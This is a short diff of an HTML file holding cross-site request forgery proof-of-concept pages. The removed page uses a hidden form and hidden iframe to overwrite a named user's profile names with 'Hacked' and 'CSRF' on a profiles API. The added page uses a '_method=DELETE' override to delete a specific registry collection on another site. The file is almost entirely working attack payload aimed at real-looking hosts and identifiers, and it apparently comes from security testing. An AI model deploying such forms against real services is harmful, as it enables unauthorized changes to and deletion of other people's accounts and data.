@@ -1,18 +1,11 @@
 <!doctype html>
 <html>
-<head>
-  <meta charset="utf-8">
-  <title>CSRF PoC - Form Encoded</title>
-</head>
-<body>
-  <h2>CSRF PoC - Exploit Form-Encoded</h2>
-
-  <form action="https://profiles-api.datacamp.com/user/noyono010101" method="POST" target="hiddenFrame">
-    <input type="hidden" name="firstName" value="Hacked">
-    <input type="hidden" name="lastName" value="CSRF">
-    <button type="submit">Send CSRF</button>
-  </form>
-
-  <iframe name="hiddenFrame" style="display:none;"></iframe>
-</body>
+  <body>
+    <h3>CSRF method-override PoC</h3>
+    <form action="https://baby.zola.com/web-registry-api/v1/registryCollection/delete/68ccdeec10d6da0e8d49450b" method="POST">
+      <!-- common override parameter name -->
+      <input type="hidden" name="_method" value="DELETE">
+      <input type="submit" value="Submit CSRF">
+    </form>
+  </body>
 </html>
